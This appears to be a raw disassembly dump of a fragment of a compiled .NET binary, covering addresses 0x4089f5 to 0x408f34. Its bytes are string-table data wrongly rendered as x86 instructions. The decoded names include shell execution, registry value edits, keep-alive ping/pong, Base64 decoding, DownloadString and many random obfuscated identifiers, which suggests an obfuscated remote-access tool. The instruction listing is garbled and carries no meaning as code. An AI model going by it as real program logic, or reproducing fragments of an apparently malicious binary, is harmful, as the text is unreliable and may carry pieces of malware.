  4089f5:	72 61                	jb     0x408a58
  4089f7:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4089fa:	61                   	popa
  4089fb:	72 6b                	jb     0x408a68
  4089fd:	41                   	inc    %ecx
  4089fe:	74 74                	je     0x408a74
  408a00:	72 69                	jb     0x408a6b
  408a02:	62 75 74             	bound  %esi,0x74(%ebp)
  408a05:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408a0a:	67 65 74 46          	addr16 gs je 0x408a54
  408a0e:	72 61                	jb     0x408a71
  408a10:	6d                   	insl   (%dx),%es:(%edi)
  408a11:	65 77 6f             	gs ja  0x408a83
  408a14:	72 6b                	jb     0x408a81
  408a16:	41                   	inc    %ecx
  408a17:	74 74                	je     0x408a8d
  408a19:	72 69                	jb     0x408a84
  408a1b:	62 75 74             	bound  %esi,0x74(%ebp)
  408a1e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a22:	73 65                	jae    0x408a89
  408a24:	6d                   	insl   (%dx),%es:(%edi)
  408a25:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408a29:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  408a30:	69 
  408a31:	6f                   	outsl  %ds:(%esi),(%dx)
  408a32:	6e                   	outsb  %ds:(%esi),(%dx)
  408a33:	41                   	inc    %ecx
  408a34:	74 74                	je     0x408aaa
  408a36:	72 69                	jb     0x408aa1
  408a38:	62 75 74             	bound  %esi,0x74(%ebp)
  408a3b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a3f:	73 65                	jae    0x408aa6
  408a41:	6d                   	insl   (%dx),%es:(%edi)
  408a42:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408a46:	6f                   	outsl  %ds:(%esi),(%dx)
  408a47:	6e                   	outsb  %ds:(%esi),(%dx)
  408a48:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  408a4e:	74 69                	je     0x408ab9
  408a50:	6f                   	outsl  %ds:(%esi),(%dx)
  408a51:	6e                   	outsb  %ds:(%esi),(%dx)
  408a52:	41                   	inc    %ecx
  408a53:	74 74                	je     0x408ac9
  408a55:	72 69                	jb     0x408ac0
  408a57:	62 75 74             	bound  %esi,0x74(%ebp)
  408a5a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a5e:	73 65                	jae    0x408ac5
  408a60:	6d                   	insl   (%dx),%es:(%edi)
  408a61:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408a65:	65 73 63             	gs jae 0x408acb
  408a68:	72 69                	jb     0x408ad3
  408a6a:	70 74                	jo     0x408ae0
  408a6c:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408a73:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  408a7a:	65 66 61             	gs popaw
  408a7d:	75 6c                	jne    0x408aeb
  408a7f:	74 4d                	je     0x408ace
  408a81:	65 6d                	gs insl (%dx),%es:(%edi)
  408a83:	62 65 72             	bound  %esp,0x72(%ebp)
  408a86:	41                   	inc    %ecx
  408a87:	74 74                	je     0x408afd
  408a89:	72 69                	jb     0x408af4
  408a8b:	62 75 74             	bound  %esi,0x74(%ebp)
  408a8e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408a92:	6d                   	insl   (%dx),%es:(%edi)
  408a93:	70 69                	jo     0x408afe
  408a95:	6c                   	insb   (%dx),%es:(%edi)
  408a96:	61                   	popa
  408a97:	74 69                	je     0x408b02
  408a99:	6f                   	outsl  %ds:(%esi),(%dx)
  408a9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9b:	52                   	push   %edx
  408a9c:	65 6c                	gs insb (%dx),%es:(%edi)
  408a9e:	61                   	popa
  408a9f:	78 61                	js     0x408b02
  408aa1:	74 69                	je     0x408b0c
  408aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  408aa4:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa5:	73 41                	jae    0x408ae8
  408aa7:	74 74                	je     0x408b1d
  408aa9:	72 69                	jb     0x408b14
  408aab:	62 75 74             	bound  %esi,0x74(%ebp)
  408aae:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408ab2:	73 65                	jae    0x408b19
  408ab4:	6d                   	insl   (%dx),%es:(%edi)
  408ab5:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408ab9:	72 6f                	jb     0x408b2a
  408abb:	64 75 63             	fs jne 0x408b21
  408abe:	74 41                	je     0x408b01
  408ac0:	74 74                	je     0x408b36
  408ac2:	72 69                	jb     0x408b2d
  408ac4:	62 75 74             	bound  %esi,0x74(%ebp)
  408ac7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408acb:	73 65                	jae    0x408b32
  408acd:	6d                   	insl   (%dx),%es:(%edi)
  408ace:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408ad2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ad3:	70 79                	jo     0x408b4e
  408ad5:	72 69                	jb     0x408b40
  408ad7:	67 68 74 41 74 74    	addr16 push $0x74744174
  408add:	72 69                	jb     0x408b48
  408adf:	62 75 74             	bound  %esi,0x74(%ebp)
  408ae2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408ae6:	73 65                	jae    0x408b4d
  408ae8:	6d                   	insl   (%dx),%es:(%edi)
  408ae9:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408aed:	6f                   	outsl  %ds:(%esi),(%dx)
  408aee:	6d                   	insl   (%dx),%es:(%edi)
  408aef:	70 61                	jo     0x408b52
  408af1:	6e                   	outsb  %ds:(%esi),(%dx)
  408af2:	79 41                	jns    0x408b35
  408af4:	74 74                	je     0x408b6a
  408af6:	72 69                	jb     0x408b61
  408af8:	62 75 74             	bound  %esi,0x74(%ebp)
  408afb:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408aff:	6e                   	outsb  %ds:(%esi),(%dx)
  408b00:	74 69                	je     0x408b6b
  408b02:	6d                   	insl   (%dx),%es:(%edi)
  408b03:	65 43                	gs inc %ebx
  408b05:	6f                   	outsl  %ds:(%esi),(%dx)
  408b06:	6d                   	insl   (%dx),%es:(%edi)
  408b07:	70 61                	jo     0x408b6a
  408b09:	74 69                	je     0x408b74
  408b0b:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408b0e:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408b15:	69 
  408b16:	62 75 74             	bound  %esi,0x74(%ebp)
  408b19:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408b1d:	74 5f                	je     0x408b7e
  408b1f:	55                   	push   %ebp
  408b20:	73 65                	jae    0x408b87
  408b22:	53                   	push   %ebx
  408b23:	68 65 6c 6c 45       	push   $0x456c6c65
  408b28:	78 65                	js     0x408b8f
  408b2a:	63 75 74             	arpl   %esi,0x74(%ebp)
  408b2d:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408b31:	61                   	popa
  408b32:	64 42                	fs inc %edx
  408b34:	79 74                	jns    0x408baa
  408b36:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408b3a:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408b41:	00 
  408b42:	44                   	inc    %esp
  408b43:	65 6c                	gs insb (%dx),%es:(%edi)
  408b45:	65 74 65             	gs je  0x408bad
  408b48:	56                   	push   %esi
  408b49:	61                   	popa
  408b4a:	6c                   	insb   (%dx),%es:(%edi)
  408b4b:	75 65                	jne    0x408bb2
  408b4d:	00 47 65             	add    %al,0x65(%edi)
  408b50:	74 56                	je     0x408ba8
  408b52:	61                   	popa
  408b53:	6c                   	insb   (%dx),%es:(%edi)
  408b54:	75 65                	jne    0x408bbb
  408b56:	00 53 65             	add    %dl,0x65(%ebx)
  408b59:	74 56                	je     0x408bb1
  408b5b:	61                   	popa
  408b5c:	6c                   	insb   (%dx),%es:(%edi)
  408b5d:	75 65                	jne    0x408bc4
  408b5f:	00 67 65             	add    %ah,0x65(%edi)
  408b62:	74 5f                	je     0x408bc3
  408b64:	4b                   	dec    %ebx
  408b65:	65 65 70 41          	gs gs jo 0x408baa
  408b69:	6c                   	insb   (%dx),%es:(%edi)
  408b6a:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408b71:	5f                   	pop    %edi
  408b72:	4b                   	dec    %ebx
  408b73:	65 65 70 41          	gs gs jo 0x408bb8
  408b77:	6c                   	insb   (%dx),%es:(%edi)
  408b78:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b80:	76 65                	jbe    0x408be7
  408b82:	00 73 65             	add    %dh,0x65(%ebx)
  408b85:	74 5f                	je     0x408be6
  408b87:	42                   	inc    %edx
  408b88:	6c                   	insb   (%dx),%es:(%edi)
  408b89:	6f                   	outsl  %ds:(%esi),(%dx)
  408b8a:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408b8d:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408b94:	5f                   	pop    %edi
  408b95:	54                   	push   %esp
  408b96:	6f                   	outsl  %ds:(%esi),(%dx)
  408b97:	74 61                	je     0x408bfa
  408b99:	6c                   	insb   (%dx),%es:(%edi)
  408b9a:	53                   	push   %ebx
  408b9b:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408ba2:	5f                   	pop    %edi
  408ba3:	48                   	dec    %eax
  408ba4:	65 61                	gs popa
  408ba6:	64 65 72 53          	fs gs jb 0x408bfd
  408baa:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408bb1:	5f                   	pop    %edi
  408bb2:	48                   	dec    %eax
  408bb3:	65 61                	gs popa
  408bb5:	64 65 72 53          	fs gs jb 0x408c0c
  408bb9:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408bc0:	5f                   	pop    %edi
  408bc1:	53                   	push   %ebx
  408bc2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408bc4:	64 42                	fs inc %edx
  408bc6:	75 66                	jne    0x408c2e
  408bc8:	66 65 72 53          	data16 gs jb 0x408c1f
  408bcc:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408bd3:	5f                   	pop    %edi
  408bd4:	52                   	push   %edx
  408bd5:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408bd9:	76 65                	jbe    0x408c40
  408bdb:	42                   	inc    %edx
  408bdc:	75 66                	jne    0x408c44
  408bde:	66 65 72 53          	data16 gs jb 0x408c35
  408be2:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408be9:	5f                   	pop    %edi
  408bea:	4b                   	dec    %ebx
  408beb:	65 79 53             	gs jns 0x408c41
  408bee:	69 7a 65 00 7a 57 58 	imul   $0x58577a00,0x65(%edx),%edi
  408bf5:	61                   	popa
  408bf6:	54                   	push   %esp
  408bf7:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf8:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf9:	46                   	inc    %esi
  408bfa:	73 46                	jae    0x408c42
  408bfc:	51                   	push   %ecx
  408bfd:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfe:	58                   	pop    %eax
  408bff:	66 00 48 77          	data16 add %cl,0x77(%eax)
  408c03:	57                   	push   %edi
  408c04:	79 64                	jns    0x408c6a
  408c06:	53                   	push   %ebx
  408c07:	68 46 42 6a 66       	push   $0x666a4246
  408c0c:	42                   	inc    %edx
  408c0d:	5a                   	pop    %edx
  408c0e:	65 66 00 4d 61       	data16 add %cl,%gs:0x61(%ebp)
  408c13:	4b                   	dec    %ebx
  408c14:	45                   	inc    %ebp
  408c15:	4f                   	dec    %edi
  408c16:	4a                   	dec    %edx
  408c17:	56                   	push   %esi
  408c18:	51                   	push   %ecx
  408c19:	4d                   	dec    %ebp
  408c1a:	79 4a                	jns    0x408c66
  408c1c:	67 00 6b 4a          	add    %ch,0x4a(%bp,%di)
  408c20:	41                   	inc    %ecx
  408c21:	4d                   	dec    %ebp
  408c22:	47                   	inc    %edi
  408c23:	45                   	inc    %ebp
  408c24:	4b                   	dec    %ebx
  408c25:	74 66                	je     0x408c8d
  408c27:	56                   	push   %esi
  408c28:	48                   	dec    %eax
  408c29:	56                   	push   %esi
  408c2a:	67 00 54 65          	add    %dl,0x65(%si)
  408c2e:	79 7a                	jns    0x408caa
  408c30:	72 68                	jb     0x408c9a
  408c32:	4b                   	dec    %ebx
  408c33:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408c36:	72 50                	jb     0x408c88
  408c38:	6e                   	outsb  %ds:(%esi),(%dx)
  408c39:	59                   	pop    %ecx
  408c3a:	66 67 00 4a 51       	data16 add %cl,0x51(%bp,%si)
  408c3f:	55                   	push   %ebp
  408c40:	6d                   	insl   (%dx),%es:(%edi)
  408c41:	56                   	push   %esi
  408c42:	44                   	inc    %esp
  408c43:	6e                   	outsb  %ds:(%esi),(%dx)
  408c44:	54                   	push   %esp
  408c45:	65 4a                	gs dec %edx
  408c47:	51                   	push   %ecx
  408c48:	72 47                	jb     0x408c91
  408c4a:	67 67 00 43 72       	addr16 add %al,0x72(%bp,%di)
  408c4f:	79 70                	jns    0x408cc1
  408c51:	74 6f                	je     0x408cc2
  408c53:	43                   	inc    %ebx
  408c54:	6f                   	outsl  %ds:(%esi),(%dx)
  408c55:	6e                   	outsb  %ds:(%esi),(%dx)
  408c56:	66 69 67 00 70 79    	imul   $0x7970,0x0(%edi),%sp
  408c5c:	5a                   	pop    %edx
  408c5d:	77 52                	ja     0x408cb1
  408c5f:	70 72                	jo     0x408cd3
  408c61:	73 61                	jae    0x408cc4
  408c63:	77 6d                	ja     0x408cd2
  408c65:	67 00 67 65          	add    %ah,0x65(%bx)
  408c69:	74 5f                	je     0x408cca
  408c6b:	50                   	push   %eax
  408c6c:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c73:	5f                   	pop    %edi
  408c74:	50                   	push   %eax
  408c75:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c7c:	74 65                	je     0x408ce3
  408c7e:	6d                   	insl   (%dx),%es:(%edi)
  408c7f:	2e 54                	cs push %esp
  408c81:	68 72 65 61 64       	push   $0x64616572
  408c86:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c8d:	5f                   	pop    %edi
  408c8e:	50                   	push   %eax
  408c8f:	61                   	popa
  408c90:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408c97:	64 64 
  408c99:	5f                   	pop    %edi
  408c9a:	53                   	push   %ebx
  408c9b:	65 73 73             	gs jae 0x408d11
  408c9e:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408ca5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca6:	67 00 55 54          	add    %dl,0x54(%di)
  408caa:	46                   	inc    %esi
  408cab:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408cae:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408cb1:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408cb8:	74 65                	je     0x408d1f
  408cba:	6d                   	insl   (%dx),%es:(%edi)
  408cbb:	2e 44                	cs inc %esp
  408cbd:	72 61                	jb     0x408d20
  408cbf:	77 69                	ja     0x408d2a
  408cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc2:	67 2e 49             	addr16 cs dec %ecx
  408cc5:	6d                   	insl   (%dx),%es:(%edi)
  408cc6:	61                   	popa
  408cc7:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408cce:	73 
  408ccf:	74 65                	je     0x408d36
  408cd1:	6d                   	insl   (%dx),%es:(%edi)
  408cd2:	2e 52                	cs push %edx
  408cd4:	75 6e                	jne    0x408d44
  408cd6:	74 69                	je     0x408d41
  408cd8:	6d                   	insl   (%dx),%es:(%edi)
  408cd9:	65 2e 56             	gs cs push %esi
  408cdc:	65 72 73             	gs jb  0x408d52
  408cdf:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408ce6:	46                   	inc    %esi
  408ce7:	72 6f                	jb     0x408d58
  408ce9:	6d                   	insl   (%dx),%es:(%edi)
  408cea:	42                   	inc    %edx
  408ceb:	61                   	popa
  408cec:	73 65                	jae    0x408d53
  408cee:	36 34 53             	ss xor $0x53,%al
  408cf1:	74 72                	je     0x408d65
  408cf3:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408cfa:	61                   	popa
  408cfb:	73 65                	jae    0x408d62
  408cfd:	36 34 53             	ss xor $0x53,%al
  408d00:	74 72                	je     0x408d74
  408d02:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408d09:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0a:	6c                   	insb   (%dx),%es:(%edi)
  408d0b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d0c:	61                   	popa
  408d0d:	64 53                	fs push %ebx
  408d0f:	74 72                	je     0x408d83
  408d11:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408d18:	74 72                	je     0x408d8c
  408d1a:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408d21:	5f                   	pop    %edi
  408d22:	41                   	inc    %ecx
  408d23:	73 53                	jae    0x408d78
  408d25:	74 72                	je     0x408d99
  408d27:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408d2e:	5f                   	pop    %edi
  408d2f:	41                   	inc    %ecx
  408d30:	73 53                	jae    0x408d85
  408d32:	74 72                	je     0x408da6
  408d34:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408d3b:	53                   	push   %ebx
  408d3c:	74 72                	je     0x408db0
  408d3e:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408d45:	73 74                	jae    0x408dbb
  408d47:	72 69                	jb     0x408db2
  408d49:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4a:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408d4e:	73 74                	jae    0x408dc4
  408d50:	65 6d                	gs insl (%dx),%es:(%edi)
  408d52:	2e 44                	cs inc %esp
  408d54:	72 61                	jb     0x408db7
  408d56:	77 69                	ja     0x408dc1
  408d58:	6e                   	outsb  %ds:(%esi),(%dx)
  408d59:	67 00 67 65          	add    %ah,0x65(%bx)
  408d5d:	74 5f                	je     0x408dbe
  408d5f:	41                   	inc    %ecx
  408d60:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d64:	61                   	popa
  408d65:	74 65                	je     0x408dcc
  408d67:	50                   	push   %eax
  408d68:	6f                   	outsl  %ds:(%esi),(%dx)
  408d69:	6e                   	outsb  %ds:(%esi),(%dx)
  408d6a:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408d6e:	74 5f                	je     0x408dcf
  408d70:	41                   	inc    %ecx
  408d71:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d75:	61                   	popa
  408d76:	74 65                	je     0x408ddd
  408d78:	50                   	push   %eax
  408d79:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d7b:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408d7f:	74 5f                	je     0x408de0
  408d81:	45                   	inc    %ebp
  408d82:	72 72                	jb     0x408df6
  408d84:	6f                   	outsl  %ds:(%esi),(%dx)
  408d85:	72 44                	jb     0x408dcb
  408d87:	69 61 6c 6f 67 00 58 	imul   $0x5800676f,0x6c(%ecx),%esp
  408d8e:	74 74                	je     0x408e04
  408d90:	78 74                	js     0x408e06
  408d92:	52                   	push   %edx
  408d93:	50                   	push   %eax
  408d94:	63 67 6b             	arpl   %esp,0x6b(%edi)
  408d97:	66 74 67             	data16 je 0x408e01
  408d9a:	00 4d 51             	add    %cl,0x51(%ebp)
  408d9d:	52                   	push   %edx
  408d9e:	47                   	inc    %edi
  408d9f:	4f                   	dec    %edi
  408da0:	4c                   	dec    %esp
  408da1:	6e                   	outsb  %ds:(%esi),(%dx)
  408da2:	6e                   	outsb  %ds:(%esi),(%dx)
  408da3:	66 4b                	dec    %bx
  408da5:	4e                   	dec    %esi
  408da6:	6c                   	insb   (%dx),%es:(%edi)
  408da7:	67 7a 67             	addr16 jp 0x408e11
  408daa:	00 78 48             	add    %bh,0x48(%eax)
  408dad:	57                   	push   %edi
  408dae:	45                   	inc    %ebp
  408daf:	69 6d 44 69 4d 45 55 	imul   $0x55454d69,0x44(%ebp),%ebp
  408db6:	42                   	inc    %edx
  408db7:	68 00 4c 79 76       	push   $0x76794c00
  408dbc:	6a 4d                	push   $0x4d
  408dbe:	4c                   	dec    %esp
  408dbf:	58                   	pop    %eax
  408dc0:	6c                   	insb   (%dx),%es:(%edi)
  408dc1:	6d                   	insl   (%dx),%es:(%edi)
  408dc2:	58                   	pop    %eax
  408dc3:	64 4e                	fs dec %esi
  408dc5:	47                   	inc    %edi
  408dc6:	68 00 77 6e 6e       	push   $0x6e6e7700
  408dcb:	42                   	inc    %edx
  408dcc:	58                   	pop    %eax
  408dcd:	4b                   	dec    %ebx
  408dce:	76 53                	jbe    0x408e23
  408dd0:	45                   	inc    %ebp
  408dd1:	49                   	dec    %ecx
  408dd2:	68 00 76 4e 73       	push   $0x734e7600
  408dd7:	59                   	pop    %ecx
  408dd8:	71 50                	jno    0x408e2a
  408dda:	4a                   	dec    %edx
  408ddb:	4d                   	dec    %ebp
  408ddc:	67 73 51             	addr16 jae 0x408e30
  408ddf:	51                   	push   %ecx
  408de0:	74 49                	je     0x408e2b
  408de2:	4e                   	dec    %esi
  408de3:	68 00 50 57 4a       	push   $0x4a575000
  408de8:	62 55 74             	bound  %edx,0x74(%ebp)
  408deb:	58                   	pop    %eax
  408dec:	70 74                	jo     0x408e62
  408dee:	4c                   	dec    %esp
  408def:	54                   	push   %esp
  408df0:	68 00 6c 5a 49       	push   $0x495a6c00
  408df5:	42                   	inc    %edx
  408df6:	67 41                	addr16 inc %ecx
  408df8:	43                   	inc    %ebx
  408df9:	45                   	inc    %ebp
  408dfa:	45                   	inc    %ebp
  408dfb:	6d                   	insl   (%dx),%es:(%edi)
  408dfc:	4c                   	dec    %esp
  408dfd:	6b 67 56 68          	imul   $0x68,0x56(%edi),%esp
  408e01:	00 48 4a             	add    %cl,0x4a(%eax)
  408e04:	42                   	inc    %edx
  408e05:	65 69 64 58 74 53 55 	imul   $0x49435553,%gs:0x74(%eax,%ebx,2),%esp
  408e0c:	43 49 
  408e0e:	74 67                	je     0x408e77
  408e10:	71 68                	jno    0x408e7a
  408e12:	00 42 6e             	add    %al,0x6e(%edx)
  408e15:	4e                   	dec    %esi
  408e16:	78 59                	js     0x408e71
  408e18:	79 79                	jns    0x408e93
  408e1a:	42                   	inc    %edx
  408e1b:	73 68                	jae    0x408e85
  408e1d:	00 43 6f             	add    %al,0x6f(%ebx)
  408e20:	6d                   	insl   (%dx),%es:(%edi)
  408e21:	70 75                	jo     0x408e98
  408e23:	74 65                	je     0x408e8a
  408e25:	48                   	dec    %eax
  408e26:	61                   	popa
  408e27:	73 68                	jae    0x408e91
  408e29:	00 56 65             	add    %dl,0x65(%esi)
  408e2c:	72 69                	jb     0x408e97
  408e2e:	66 79 48             	data16 jns 0x408e79
  408e31:	61                   	popa
  408e32:	73 68                	jae    0x408e9c
  408e34:	00 46 6c             	add    %al,0x6c(%esi)
  408e37:	75 73                	jne    0x408eac
  408e39:	68 00 67 65 74       	push   $0x74656700
  408e3e:	5f                   	pop    %edi
  408e3f:	45                   	inc    %ebp
  408e40:	78 65                	js     0x408ea7
  408e42:	63 75 74             	arpl   %esi,0x74(%ebp)
  408e45:	61                   	popa
  408e46:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408e4a:	61                   	popa
  408e4b:	74 68                	je     0x408eb5
  408e4d:	00 47 65             	add    %al,0x65(%edi)
  408e50:	74 54                	je     0x408ea6
  408e52:	65 6d                	gs insl (%dx),%es:(%edi)
  408e54:	70 50                	jo     0x408ea6
  408e56:	61                   	popa
  408e57:	74 68                	je     0x408ec1
  408e59:	00 67 65             	add    %ah,0x65(%edi)
  408e5c:	74 5f                	je     0x408ebd
  408e5e:	4c                   	dec    %esp
  408e5f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e61:	67 74 68             	addr16 je 0x408ecc
  408e64:	00 72 44             	add    %dh,0x44(%edx)
  408e67:	48                   	dec    %eax
  408e68:	65 63 4c 58 52       	arpl   %ecx,%gs:0x52(%eax,%ebx,2)
  408e6d:	63 78 52             	arpl   %edi,0x52(%eax)
  408e70:	4a                   	dec    %edx
  408e71:	69 00 74 61 74 73    	imul   $0x73746174,(%eax),%eax
  408e77:	45                   	inc    %ebp
  408e78:	6e                   	outsb  %ds:(%esi),(%dx)
  408e79:	5a                   	pop    %edx
  408e7a:	59                   	pop    %ecx
  408e7b:	4c                   	dec    %esp
  408e7c:	69 00 75 42 4a 61    	imul   $0x614a4275,(%eax),%eax
  408e82:	44                   	inc    %esp
  408e83:	73 44                	jae    0x408ec9
  408e85:	70 42                	jo     0x408ec9
  408e87:	47                   	inc    %edi
  408e88:	46                   	inc    %esi
  408e89:	4d                   	dec    %ebp
  408e8a:	70 53                	jo     0x408edf
  408e8c:	69 00 68 61 53 51    	imul   $0x51536168,(%eax),%eax
  408e92:	76 71                	jbe    0x408f05
  408e94:	4f                   	dec    %edi
  408e95:	56                   	push   %esi
  408e96:	58                   	pop    %eax
  408e97:	69 61 69 00 50 75 4c 	imul   $0x4c755000,0x69(%ecx),%esp
  408e9e:	63 6b 6a             	arpl   %ebp,0x6a(%ebx)
  408ea1:	73 46                	jae    0x408ee9
  408ea3:	57                   	push   %edi
  408ea4:	66 69 00 55 72       	imul   $0x7255,(%eax),%ax
  408ea9:	69 00 69 51 56 47    	imul   $0x47565169,(%eax),%eax
  408eaf:	6d                   	insl   (%dx),%es:(%edi)
  408eb0:	5a                   	pop    %edx
  408eb1:	4f                   	dec    %edi
  408eb2:	76 76                	jbe    0x408f2a
  408eb4:	4d                   	dec    %ebp
  408eb5:	54                   	push   %esp
  408eb6:	77 72                	ja     0x408f2a
  408eb8:	48                   	dec    %eax
  408eb9:	6a 00                	push   $0x0
  408ebb:	66 67 68 4a 45       	addr16 pushw $0x454a
  408ec0:	4f                   	dec    %edi
  408ec1:	4f                   	dec    %edi
  408ec2:	55                   	push   %ebp
  408ec3:	48                   	dec    %eax
  408ec4:	6c                   	insb   (%dx),%es:(%edi)
  408ec5:	50                   	push   %eax
  408ec6:	6a 00                	push   $0x0
  408ec8:	4e                   	dec    %esi
  408ec9:	4b                   	dec    %ebx
  408eca:	68 48 5a 42 6b       	push   $0x6b425a48
  408ecf:	7a 52                	jp     0x408f23
  408ed1:	6a 00                	push   $0x0
  408ed3:	52                   	push   %edx
  408ed4:	56                   	push   %esi
  408ed5:	44                   	inc    %esp
  408ed6:	4c                   	dec    %esp
  408ed7:	67 6f                	outsl  %ds:(%si),(%dx)
  408ed9:	48                   	dec    %eax
  408eda:	54                   	push   %esp
  408edb:	68 54 6a 00 6e       	push   $0x6e006a54
  408ee0:	50                   	push   %eax
  408ee1:	6c                   	insb   (%dx),%es:(%edi)
  408ee2:	47                   	inc    %edi
  408ee3:	71 54                	jno    0x408f39
  408ee5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ee6:	46                   	inc    %esi
  408ee7:	4b                   	dec    %ebx
  408ee8:	4f                   	dec    %edi
  408ee9:	4b                   	dec    %ebx
  408eea:	56                   	push   %esi
  408eeb:	6a 00                	push   $0x0
  408eed:	72 66                	jb     0x408f55
  408eef:	72 4b                	jb     0x408f3c
  408ef1:	7a 58                	jp     0x408f4b
  408ef3:	4b                   	dec    %ebx
  408ef4:	79 41                	jns    0x408f37
  408ef6:	70 49                	jo     0x408f41
  408ef8:	65 50                	gs push %eax
  408efa:	73 42                	jae    0x408f3e
  408efc:	61                   	popa
  408efd:	6a 00                	push   $0x0
  408eff:	6a 42                	push   $0x42
  408f01:	51                   	push   %ecx
  408f02:	4e                   	dec    %esi
  408f03:	62 64 77 49          	bound  %esp,0x49(%edi,%esi,2)
  408f07:	45                   	inc    %ebp
  408f08:	42                   	inc    %edx
  408f09:	4a                   	dec    %edx
  408f0a:	6a 56                	push   $0x56
  408f0c:	63 6a 00             	arpl   %ebp,0x0(%edx)
  408f0f:	52                   	push   %edx
  408f10:	50                   	push   %eax
  408f11:	6d                   	insl   (%dx),%es:(%edi)
  408f12:	66 62 72 53          	bound  %si,0x53(%edx)
  408f16:	5a                   	pop    %edx
  408f17:	4e                   	dec    %esi
  408f18:	68 68 63 6a 00       	push   $0x6a6368
  408f1d:	77 56                	ja     0x408f75
  408f1f:	50                   	push   %eax
  408f20:	55                   	push   %ebp
  408f21:	48                   	dec    %eax
  408f22:	45                   	inc    %ebp
  408f23:	56                   	push   %esi
  408f24:	4f                   	dec    %edi
  408f25:	6a 74                	push   $0x74
  408f27:	65 69 6a 00 67 6d 53 	imul   $0x4f536d67,%gs:0x0(%edx),%ebp
  408f2e:	4f 
  408f2f:	65 79 52             	gs jns 0x408f84
  408f32:	6a 58                	push   $0x58
  408f34:	7a 73                	jp     0x408fa9
